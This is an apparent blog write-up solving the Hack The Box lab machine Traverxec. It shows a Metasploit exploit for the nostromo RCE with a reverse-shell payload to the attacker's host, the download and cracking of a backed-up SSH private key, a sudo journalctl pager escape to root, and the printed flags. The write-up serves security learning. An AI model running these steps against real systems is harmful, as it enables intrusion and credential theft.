+++
title = 'Hack the Box Traverxec Writeup'
date = 2020-04-12T19:04:31-07:00
hideToc = true
+++
![Hack The Box Haystack](/posts/images/hack-the-box-traverxec-writeup/badge.png)

# Introduction
Traverxec is an easy box worth 20 points, hosted on `10.10.10.165`. As we will see the name is indicative of the vulnerability we'll leverage to gain our initial foothold. Despite having had difficulty with a few steps, when it's all said and done the box is rather simple. This writeup is a short one because of that.


# Information Gathering
As always, we'll add the IP of the box to our `/etc/hosts` file. So, from here on out `traverxec.htb` points to `10.10.10.165`.

## Port Scan: Nmap
We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```console
root@kali:/media/sf_Research# nmap -sVC traverxec.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 15:40 EST
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.84s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.10 seconds
```

The most important thing to notice here is that the web server running on this box is **nostromo 1.9.6**. Running a quick search for known vulnerabilities we find [CVE-2019-16278](https://www.cvedetails.com/cve/CVE-2019-16278/), which is a remote code execution bug.  

> Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request. 

Given the name of this box, we're certainly going to be exploiting this to gain our initial foothold. 


# Exploitation

## Foothold  

We can use Metasploit's module for [CVE-2019-16278](https://github.com/rapid7/metasploit-framework/pull/12476) and get a Meterpreter session on the box.

```
root@kali:~# msfconsole
[-] ***
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v5.0.58-dev                          ]
+ -- --=[ 1936 exploits - 1079 auxiliary - 333 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > set RHOSTS traverxec.htb
RHOSTS => traverxec.htb
msf5 > set LPORT 80
LPORT => 80
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.15.60
LHOST => 10.10.15.60
msf5 exploit(multi/http/nostromo_code_exec) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/http/nostromo_code_exec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/http/nostromo_code_exec) > set target 1
target => 1
msf5 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.15.60:1337 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3021284 bytes) to 10.10.10.165
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (10.10.15.60:1337 -> 10.10.10.165:47402) at 2019-12-17 13:27:54 -0500

meterpreter > 
```

## User Flag
After some manual exploration we find some interesting content inside of the `/var/nostromo/conf` directory. There's an `.htpasswd` file, but we don't need to use that, at least not the way we're going about this. What's interesting in this directory is the configuration file, `nhttpd.conf`, which indicates the existence of another folder we need to take a look at.



```console
meterpreter > cd /var/nostromo/conf
meterpreter > ls
Listing: /var/nostromo/conf
===========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  41    fil   2019-10-25 15:20:50 -0400  .htpasswd
100644/rw-r--r--  2928  fil   2019-10-25 14:43:20 -0400  mimes
100644/rw-r--r--  498   fil   2019-10-27 16:12:13 -0400  nhttpd.conf

meterpreter > cat nhttpd.conf
# MAIN [MANDATORY]

servername    traverxec.htb
serverlisten    *
serveradmin   david@traverxec.htb
serverroot    /var/nostromo
servermimes   conf/mimes
docroot     /var/nostromo/htdocs
docindex    index.html

# LOGS [OPTIONAL]

logpid      logs/nhttpd.pid

# SETUID [RECOMMENDED]

user      www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess    .htaccess
htpasswd    /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons      /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs    /home
homedirs_public   public_www

```

The configuration file above indicates the existence of a `public_www` directory inside the `/home` directory. After some trial and error, we can determine that this is David's home directory, as he's the admin.


```
meterpreter > cd /home/david/public_www
meterpreter > ls
Listing: /home/david/public_www
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  402   fil   2019-10-25 15:45:10 -0400  index.html
40755/rwxr-xr-x   4096  dir   2019-10-25 17:02:59 -0400  protected-file-area
```

Now we find a directory named `protected-file-area` inside of `/home/david/public_www`. This folder contains `backup-ssh-identity-files.tgz`, which we can hopefully use to gain user access to the box as david.

```
meterpreter > cd ./protected-file-area
meterpreter > ls
Listing: /home/david/public_www/protected-file-area
===================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  45    fil   2019-10-25 15:46:01 -0400  .htaccess
100644/rw-r--r--  1915  fil   2019-10-25 17:02:59 -0400  backup-ssh-identity-files.tgz

meterpreter > download ./backup-ssh-identity-files.tgz ./
[*] Downloading: ./backup-ssh-identity-files.tgz -> .//backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): ./backup-ssh-identity-files.tgz -> .//backup-ssh-identity-files.tgz
[*] download   : ./backup-ssh-identity-files.tgz -> .//backup-ssh-identity-files.tgz
meterpreter > 
```

We can download the `backup-ssh-identity-files.tgz` file through our Meterpreter session, and then extract it on our Kali box.


```
root@kali:~# tar -zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

```

When we try and use the keys we'll see that David has set a password required to unlock them, annoying. Using `ssh2john` we can create a hash of the private key to use to brute force the key through john.

```
root@kali:~/home/david/.ssh# python ~/Tools/ssh2john.py id_rsa > id_rsa_hash
root@kali:~/home/david/.ssh# ls -lah
total 24K
drwx------ 2 1000 1000 4.0K Dec 15 19:55 .
drwxr-xr-x 3 root root 4.0K Dec 12 20:27 ..
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 authorized_keys
-rw------- 1 1000 1000 1.8K Oct 25 17:02 id_rsa
-rw-r--r-- 1 root root 2.5K Dec 15 19:55 id_rsa_hash
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 id_rsa.pub
root@kali:~/home/david/.ssh# john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:06 DONE (2019-12-15 19:56) 0.1547g/s 2220Kp/s 2220Kc/s 2220KC/sa6_123..*7¡Vamos!
Session completed
root@kali:~/home/david/.ssh# 
```

After running john and the `rockyou.txt` wordlist to try and crack the key, we get `hunter`. Now that we've got the got the keys and the credentials to use them, we can ssh in as David and grab the flag.

```
root@kali:~/home/david/.ssh# ssh david@traverxec.htb

Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Dec 15 19:54:38 2019 from 10.10.15.105
david@traverxec:~$ 
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```


## Root Flag  
David's home directory has a directory within it called `/bin`, which sticks out immediately. Exploring that directory we find `server-stats.sh`. This file appears to use the sudo command, as seen on the last line below.

```
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~/bin$ ls
journalctl  server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~/bin$ 
```

Knowing that this script is calling `journalctl` as root means that it's most definitely going to be what we need to exploit for our privilege escalation. Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/) for `journalctl` it states that the pager will be invoked (`less`). We can pop a shell using `!/bin/sh`, or we can execute basically any commands we'd like if we precede them with `!`.

After some playing around we can confirm that executing `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` does not require us to enter a password, and does indeed invoke `less`. All we need to do in order to exploit this is to shrink the terminal window down a bit, under 6 lines, and execute `!/bin/bash` to get our root shell.

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2019-12-17 10:09:44 EST, end at Tue 2019-12-17 11:38:42 EST. --
Dec 17 11:15:54 traverxec sudo[2264]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Dec 17 11:15:54 traverxec sudo[2264]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): conversation failed
Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Dec 17 11:18:40 traverxec sudo[2319]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
!/usr/bin/bash
root@traverxec:/home/david/bin# cat /root/root.txt
9aa36a6d76f785dfd320a478f6e0d906
root@traverxec:/home/david/bin# 
```

# Conclusion  
This box was really straight forward for the most part. The initial foothold was obvious, and using the Metasploit module made it very easy. Finding the public directory inside David's home directory via the nostromo configuration was probably the most confusing part, at least from my perspective. Once we found that directory, Meterpreter allowed us to download the backup file of ssh keys quite easily. The keys did have a password, but cracking this was also rather simple since the password would be present on almost any wordlist. The path to root was clear immediately after gaining access as the user. While the method we were to use to exploit it was also clear right away, actually doing so still took me about a day, as I was over thinking it a bit. Traverxec was a fun box, and well named. It was my first box in quite a few months, and a nice reintroduction. 
